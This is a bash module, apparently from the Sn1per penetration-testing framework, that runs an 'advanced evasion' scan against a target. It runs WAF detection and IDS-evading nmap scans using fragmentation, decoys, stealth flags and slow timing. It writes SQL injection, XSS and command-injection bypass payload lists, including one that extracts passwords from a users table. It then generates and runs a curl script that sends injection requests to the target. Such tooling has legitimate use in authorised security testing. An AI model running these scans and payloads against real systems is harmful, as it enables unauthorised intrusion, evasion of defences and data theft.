#!/bin/bash
# ADVANCED EVASION TECHNIQUES MODULE #####################################################################################################
# Sophisticated evasion techniques for bypassing security controls, WAFs, and detection systems

if [[ "$REPORT" = "1" ]]; then
  args="-t $TARGET"
  if [[ "$OSINT" = "1" ]]; then
    args="$args -o"
  fi
  if [[ "$AUTO_BRUTE" = "1" ]]; then
    args="$args -b"
  fi
  if [[ "$FULLNMAPSCAN" = "1" ]]; then
    args="$args -fp"
  fi
  if [[ "$RECON" = "1" ]]; then
    args="$args -re"
  fi
  if [[ "$MODE" = "evasion" ]]; then
    args="$args -m evasion"
  fi
  if [[ ! -z "$PORT" ]]; then
    args="$args -p $PORT"
  fi
  if [[ ! -z "$WORKSPACE" ]]; then
    args="$args -w $WORKSPACE"
  fi
  args="$args --noreport"
  sniper $args | tee $LOOT_DIR/output/sniper-$TARGET-`date +"%Y%m%d%H%M"`.txt 2>&1
  exit
fi

echo -e "$OKRED                ____               $RESET"
echo -e "$OKRED    _________  /  _/___  ___  _____$RESET"
echo -e "$OKRED   / ___/ __ \ / // __ \/ _ \/ ___/$RESET"
echo -e "$OKRED  (__  ) / / // // /_/ /  __/ /    $RESET"
echo -e "$OKRED /____/_/ /_/___/ .___/\___/_/     $RESET"
echo -e "$OKRED               /_/                 $RESET"
echo -e "$RESET"
echo -e "$OKORANGE + -- --=[https://sn1persecurity.com"
echo -e "$OKORANGE + -- --=[Sn1per v$VER by @xer0dayz"
echo -e "$OKORANGE + -- --=[Advanced Evasion Techniques Mode - Sophisticated Bypass Methods"
echo -e "$RESET"

if [[ ! -z $WORKSPACE ]]; then
  LOOT_DIR=$WORKSPACE_DIR
fi

echo "$TARGET" >> $LOOT_DIR/domains/targets.txt
if [[ "$MODE" = "" ]]; then
  MODE="evasion-techniques"
  echo "$TARGET $MODE `date +"%Y-%m-%d %H:%M"`" 2> /dev/null >> $LOOT_DIR/scans/tasks.txt 2>/dev/null
else
  echo "$TARGET $MODE `date +"%Y-%m-%d %H:%M"`" 2> /dev/null >> $LOOT_DIR/scans/tasks.txt 2>/dev/null
fi
echo "sniper -t $TARGET -m $MODE --noreport $args" >> $LOOT_DIR/scans/${TARGET}-${MODE}.txt 2>/dev/null
echo "sniper -t $TARGET -m $MODE --noreport $args" >> $LOOT_DIR/scans/running_${TARGET}_${MODE}.txt 2>/dev/null
ls -lh $LOOT_DIR/scans/running_*.txt 2> /dev/null | wc -l 2> /dev/null > $LOOT_DIR/scans/tasks-running.txt

echo "[sn1persecurity.com] •?((¯°·._.• Started Sn1per evasion techniques scan: $TARGET [${MODE}] (`date +"%Y-%m-%d %H:%M"`) •._.·°¯))؟•" >> $LOOT_DIR/scans/notifications_new.txt
if [[ "$SLACK_NOTIFICATIONS" == "1" ]]; then
  /bin/bash "$INSTALL_DIR/bin/slack.sh" "[sn1persecurity.com] •?((¯°·._.• Started Sn1per evasion techniques scan: $TARGET [${MODE}] (`date +"%Y-%m-%d %H:%M"`) •._.·°¯))؟•"
fi

# Initialize evasion directories
mkdir -p $LOOT_DIR/evasion-techniques/{waf-bypass,ids-evasion,stealth-scanning,fragmentation,obfuscation} 2>/dev/null

echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
echo -e "$OKRED INITIALIZING ADVANCED EVASION TECHNIQUES $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"

# 1. WAF BYPASS TECHNIQUES
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
echo -e "$OKRED WAF BYPASS TECHNIQUES $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"

echo -e "$OKBLUE[*]$RESET Testing WAF bypass techniques..."

# WAF Detection
echo -e "$OKBLUE[*]$RESET Detecting WAF presence..."
wafw00f $TARGET > $LOOT_DIR/evasion-techniques/waf-bypass/waf-detection-$TARGET.txt 2>/dev/null

# SQL Injection bypass payloads
echo -e "$OKBLUE[*]$RESET Testing SQL injection bypass techniques..."
cat > $LOOT_DIR/evasion-techniques/waf-bypass/sqli-bypass-payloads.txt << EOF
# WAF Bypass SQL Injection Payloads
' OR '1'='1
%27%20OR%20%271%27%3D%271
/**/OR/**/1=1
' OR 1=1#
' OR '1'='1'/*
' OR 1=1 LIMIT 1--
' OR 1=1-- -
'/**/OR/**/1=1--
' OR 1=1%23
' OR 1=1;%00
' OR 1=1 UNION SELECT 1,2,3--
/**/UNION/**/SELECT/**/1,2,3--
UNION SELECT 1,2,3%23
UNION SELECT 1,2,3;%00
' UNION SELECT 1,2,3%0A
' UNION SELECT 1,2,3%0D%0A
EOF

# XSS bypass payloads
echo -e "$OKBLUE[*]$RESET Testing XSS bypass techniques..."
cat > $LOOT_DIR/evasion-techniques/waf-bypass/xss-bypass-payloads.txt << EOF
# WAF Bypass XSS Payloads
<script>alert(1)</script>
<scr<script>ipt>alert(1)</scr</script>ipt>
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror=alert(1)>
<img/src=x onerror=alert(1)>
<img src=x:alert(1) onerror=alert(1)>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<body/onload=alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
<object data=javascript:alert(1)>
<frame src=javascript:alert(1)>
EOF

# 2. IDS EVASION TECHNIQUES
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
echo -e "$OKRED IDS EVASION TECHNIQUES $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"

echo -e "$OKBLUE[*]$RESET Testing IDS evasion methods..."

# Fragmented packets
echo -e "$OKBLUE[*]$RESET Testing fragmented packet techniques..."
nmap -f $TARGET > $LOOT_DIR/evasion-techniques/ids-evasion/fragmented-packets-$TARGET.txt 2>/dev/null

# Slow scanning
echo -e "$OKBLUE[*]$RESET Testing slow scanning techniques..."
nmap -T2 --scan-delay 5s $TARGET > $LOOT_DIR/evasion-techniques/ids-evasion/slow-scanning-$TARGET.txt 2>/dev/null

# Decoy scanning
echo -e "$OKBLUE[*]$RESET Testing decoy scanning techniques..."
nmap -D RND:10 $TARGET > $LOOT_DIR/evasion-techniques/ids-evasion/decoy-scanning-$TARGET.txt 2>/dev/null

# 3. STEALTH SCANNING TECHNIQUES
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
echo -e "$OKRED STEALTH SCANNING TECHNIQUES $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"

echo -e "$OKBLUE[*]$RESET Implementing stealth scanning methods..."

# SYN scanning
echo -e "$OKBLUE[*]$RESET Testing SYN scanning..."
nmap -sS $TARGET > $LOOT_DIR/evasion-techniques/stealth-scanning/syn-scan-$TARGET.txt 2>/dev/null

# ACK scanning
echo -e "$OKBLUE[*]$RESET Testing ACK scanning..."
nmap -sA $TARGET > $LOOT_DIR/evasion-techniques/stealth-scanning/ack-scan-$TARGET.txt 2>/dev/null

# FIN scanning
echo -e "$OKBLUE[*]$RESET Testing FIN scanning..."
nmap -sF $TARGET > $LOOT_DIR/evasion-techniques/stealth-scanning/fin-scan-$TARGET.txt 2>/dev/null

# NULL scanning
echo -e "$OKBLUE[*]$RESET Testing NULL scanning..."
nmap -sN $TARGET > $LOOT_DIR/evasion-techniques/stealth-scanning/null-scan-$TARGET.txt 2>/dev/null

# XMAS scanning
echo -e "$OKBLUE[*]$RESET Testing XMAS scanning..."
nmap -sX $TARGET > $LOOT_DIR/evasion-techniques/stealth-scanning/xmas-scan-$TARGET.txt 2>/dev/null

# 4. FRAGMENTATION TECHNIQUES
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
echo -e "$OKRED PACKET FRAGMENTATION TECHNIQUES $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"

echo -e "$OKBLUE[*]$RESET Testing packet fragmentation methods..."

# IP fragmentation
echo -e "$OKBLUE[*]$RESET Testing IP fragmentation..."
nmap --mtu 16 $TARGET > $LOOT_DIR/evasion-techniques/fragmentation/ip-fragmentation-$TARGET.txt 2>/dev/null

# TCP fragmentation
echo -e "$OKBLUE[*]$RESET Testing TCP fragmentation..."
nmap -f --mtu 32 $TARGET > $LOOT_DIR/evasion-techniques/fragmentation/tcp-fragmentation-$TARGET.txt 2>/dev/null

# 5. PAYLOAD OBFUSCATION
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
echo -e "$OKRED PAYLOAD OBFUSCATION TECHNIQUES $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"

echo -e "$OKBLUE[*]$RESET Testing payload obfuscation methods..."

# Create obfuscated payloads
cat > $LOOT_DIR/evasion-techniques/obfuscation/obfuscated-payloads.txt << EOF
# Obfuscated SQL Injection Payloads
/**/OR/**/1=1--
'/**/OR/**/1=1--
%27%20OR%20%271%27%3D%271
%27%20%4F%52%20%271%27%3D%271
' OR '1'='1' %23
' OR 1=1%0A
' OR 1=1%0D%0A

# Obfuscated XSS Payloads
<scr%0Aipt>alert(1)</scr%0Aipt>
<scr%0Dipt>alert(1)</scr%0Dipt>
<scr%09ipt>alert(1)</scr%09ipt>
<img%0Asrc=x%0Aonerror=alert(1)>
<img%0Dsrc=x%0Donerror=alert(1)>
<img%09src=x%09onerror=alert(1)>

# Obfuscated Command Injection
|cmd
||cmd
;cmd
&&cmd
%0Acmd
%0Dcmd
%09cmd
%0A%0Dcmd
EOF

# 6. TIMING-BASED EVASION
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
echo -e "$OKRED TIMING-BASED EVASION TECHNIQUES $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"

echo -e "$OKBLUE[*]$RESET Testing timing-based evasion methods..."

# Random delay scanning
echo -e "$OKBLUE[*]$RESET Testing random delay scanning..."
nmap -T1 --scan-delay 10s --max-scan-delay 30s $TARGET > $LOOT_DIR/evasion-techniques/stealth-scanning/timing-evasion-$TARGET.txt 2>/dev/null

# 7. ENCODING-BASED EVASION
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
echo -e "$OKRED ENCODING-BASED EVASION TECHNIQUES $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"

echo -e "$OKBLUE[*]$RESET Testing encoding-based evasion methods..."

# URL encoding evasion
echo -e "$OKBLUE[*]$RESET Testing URL encoding evasion..."
cat > $LOOT_DIR/evasion-techniques/obfuscation/url-encoded-payloads.txt << EOF
# URL Encoded Payloads
%27%20OR%20%271%27%3D%271
%3Cscript%3Ealert(1)%3C/script%3E
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
%27%20UNION%20SELECT%20password%20FROM%20users--
%27%20AND%201%3D0%20UNION%20SELECT%20version()%2Cuser()%2Cdatabase()--
EOF

# 8. ADVANCED WAF BYPASS SCRIPTS
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
echo -e "$OKRED ADVANCED WAF BYPASS SCRIPTS $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"

echo -e "$OKBLUE[*]$RESET Creating advanced WAF bypass scripts..."

# WAF bypass script
cat > $LOOT_DIR/evasion-techniques/waf-bypass/bypass-script.sh << EOF
#!/bin/bash
# Advanced WAF Bypass Script for $TARGET

TARGET="$TARGET"
LOG_FILE="$LOOT_DIR/evasion-techniques/waf-bypass/bypass-results.txt"

echo "[*] Starting WAF bypass testing for $TARGET" > "$LOG_FILE"
echo "[*] Time: $(date)" >> "$LOG_FILE"

# Test various WAF bypass techniques
echo "[*] Testing case manipulation..." >> "$LOG_FILE"
curl -s "$TARGET/?id=1 OR 1=1" | grep -i "error\|blocked" >> "$LOG_FILE" 2>/dev/null || echo "[-] Case manipulation blocked" >> "$LOG_FILE"

echo "[*] Testing comment injection..." >> "$LOG_FILE"
curl -s "$TARGET/?id=1/**/OR/**/1=1" | grep -i "error\|blocked" >> "$LOG_FILE" 2>/dev/null || echo "[-] Comment injection blocked" >> "$LOG_FILE"

echo "[*] Testing encoding..." >> "$LOG_FILE"
curl -s "$TARGET/?id=%27%20OR%20%271%27%3D%271" | grep -i "error\|blocked" >> "$LOG_FILE" 2>/dev/null || echo "[-] Encoding blocked" >> "$LOG_FILE"

echo "[*] Testing whitespace manipulation..." >> "$LOG_FILE"
curl -s "$TARGET/?id=1%0AOR%0A1=1" | grep -i "error\|blocked" >> "$LOG_FILE" 2>/dev/null || echo "[-] Whitespace manipulation blocked" >> "$LOG_FILE"

echo "[+] WAF bypass testing completed" >> "$LOG_FILE"
EOF
chmod +x $LOOT_DIR/evasion-techniques/waf-bypass/bypass-script.sh

# Execute WAF bypass script
echo -e "$OKBLUE[*]$RESET Executing WAF bypass script..."
$LOOT_DIR/evasion-techniques/waf-bypass/bypass-script.sh

# 9. GENERATE EVASION TECHNIQUES REPORT
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
echo -e "$OKRED GENERATING EVASION TECHNIQUES REPORT $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"

# Compile comprehensive evasion techniques report
cat > $LOOT_DIR/evasion-techniques/evasion-report-$TARGET.txt << EOF
SNIPER SECURITY - ADVANCED EVASION TECHNIQUES REPORT
====================================================
Target: $TARGET
Scan Date: $(date)
Framework: Sn1per v$VER - Advanced Evasion Techniques Mode

EXECUTIVE SUMMARY
=================
Evasion Techniques Tested: 8 major categories
WAF Detection: $(if [[ -f "$LOOT_DIR/evasion-techniques/waf-bypass/waf-detection-$TARGET.txt" ]]; then echo "COMPLETED"; else echo "PENDING"; fi)
IDS Evasion: $(if [[ -f "$LOOT_DIR/evasion-techniques/ids-evasion/fragmented-packets-$TARGET.txt" ]]; then echo "COMPLETED"; else echo "PENDING"; fi)
Stealth Scanning: $(if [[ -f "$LOOT_DIR/evasion-techniques/stealth-scanning/syn-scan-$TARGET.txt" ]]; then echo "COMPLETED"; else echo "PENDING"; fi)

WAF BYPASS TECHNIQUES
====================
WAF Detection Results:
$(cat $LOOT_DIR/evasion-techniques/waf-bypass/waf-detection-$TARGET.txt 2>/dev/null | head -10)

SQL Injection Bypass Payloads:
$(wc -l $LOOT_DIR/evasion-techniques/waf-bypass/sqli-bypass-payloads.txt 2>/dev/null || echo "0") payloads tested

XSS Bypass Payloads:
$(wc -l $LOOT_DIR/evasion-techniques/waf-bypass/xss-bypass-payloads.txt 2>/dev/null || echo "0") payloads tested

IDS EVASION RESULTS
==================
Fragmented Packets:
$(cat $LOOT_DIR/evasion-techniques/ids-evasion/fragmented-packets-$TARGET.txt 2>/dev/null | grep -c "open\|filtered" || echo "0") ports affected

Slow Scanning:
$(cat $LOOT_DIR/evasion-techniques/ids-evasion/slow-scanning-$TARGET.txt 2>/dev/null | grep -c "open\|filtered" || echo "0") ports discovered

Decoy Scanning:
$(cat $LOOT_DIR/evasion-techniques/ids-evasion/decoy-scanning-$TARGET.txt 2>/dev/null | grep -c "open\|filtered" || echo "0") ports detected

STEALTH SCANNING RESULTS
=======================
SYN Scan Results:
$(cat $LOOT_DIR/evasion-techniques/stealth-scanning/syn-scan-$TARGET.txt 2>/dev/null | grep -c "open\|filtered" || echo "0") ports found

ACK Scan Results:
$(cat $LOOT_DIR/evasion-techniques/stealth-scanning/ack-scan-$TARGET.txt 2>/dev/null | grep -c "open\|filtered" || echo "0") ports found

FIN Scan Results:
$(cat $LOOT_DIR/evasion-techniques/stealth-scanning/fin-scan-$TARGET.txt 2>/dev/null | grep -c "open\|filtered" || echo "0") ports found

NULL Scan Results:
$(cat $LOOT_DIR/evasion-techniques/stealth-scanning/null-scan-$TARGET.txt 2>/dev/null | grep -c "open\|filtered" || echo "0") ports found

XMAS Scan Results:
$(cat $LOOT_DIR/evasion-techniques/stealth-scanning/xmas-scan-$TARGET.txt 2>/dev/null | grep -c "open\|filtered" || echo "0") ports found

FRAGMENTATION RESULTS
====================
IP Fragmentation:
$(cat $LOOT_DIR/evasion-techniques/fragmentation/ip-fragmentation-$TARGET.txt 2>/dev/null | grep -c "open\|filtered" || echo "0") ports discovered

TCP Fragmentation:
$(cat $LOOT_DIR/evasion-techniques/fragmentation/tcp-fragmentation-$TARGET.txt 2>/dev/null | grep -c "open\|filtered" || echo "0") ports discovered

OBFUSCATION RESULTS
==================
Payload Obfuscation:
$(wc -l $LOOT_DIR/evasion-techniques/obfuscation/obfuscated-payloads.txt 2>/dev/null || echo "0") obfuscation techniques tested

URL Encoding:
$(wc -l $LOOT_DIR/evasion-techniques/obfuscation/url-encoded-payloads.txt 2>/dev/null || echo "0") encoding methods tested

TIMING EVASION RESULTS
=====================
Random Delay Scanning:
$(cat $LOOT_DIR/evasion-techniques/stealth-scanning/timing-evasion-$TARGET.txt 2>/dev/null | grep -c "open\|filtered" || echo "0") ports detected

RECOMMENDATIONS
==============
1. Use fragmented packet techniques for initial reconnaissance
2. Employ timing-based evasion for comprehensive scanning
3. Utilize payload obfuscation for web application testing
4. Combine multiple evasion techniques for maximum effectiveness
5. Test WAF bypass techniques in controlled environment first
6. Monitor detection systems for false positive generation

EVASION TECHNIQUES SUMMARY
=========================
- WAF Bypass Techniques: $(ls $LOOT_DIR/evasion-techniques/waf-bypass/ 2>/dev/null | wc -l) methods tested
- IDS Evasion Techniques: $(ls $LOOT_DIR/evasion-techniques/ids-evasion/ 2>/dev/null | wc -l) methods tested
- Stealth Scanning Techniques: $(ls $LOOT_DIR/evasion-techniques/stealth-scanning/ 2>/dev/null | wc -l) methods tested
- Fragmentation Techniques: $(ls $LOOT_DIR/evasion-techniques/fragmentation/ 2>/dev/null | wc -l) methods tested
- Obfuscation Techniques: $(ls $LOOT_DIR/evasion-techniques/obfuscation/ 2>/dev/null | wc -l) methods tested

Generated by Sn1per Advanced Evasion Framework
https://sn1persecurity.com
EOF

echo -e "$OKGREEN[*]$RESET Advanced evasion techniques completed for $TARGET"
echo -e "$OKGREEN[*]$RESET Evasion methods tested: $(find $LOOT_DIR/evasion-techniques/ -name "*.txt" | wc -l) techniques"
echo -e "$OKGREEN[*]$RESET Report saved to: $LOOT_DIR/evasion-techniques/evasion-report-$TARGET.txt"

echo "[sn1persecurity.com] •?((¯°·._.• Completed Sn1per evasion techniques scan: $TARGET [${MODE}] (`date +"%Y-%m-%d %H:%M"`) •._.·°¯))؟•" >> $LOOT_DIR/scans/notifications_new.txt
if [[ "$SLACK_NOTIFICATIONS" == "1" ]]; then
  /bin/bash "$INSTALL_DIR/bin/slack.sh" "[sn1persecurity.com] •?((¯°·._.• Completed Sn1per evasion techniques scan: $TARGET [${MODE}] (`date +"%Y-%m-%d %H:%M"`) •._.·°¯))؟•"
fi
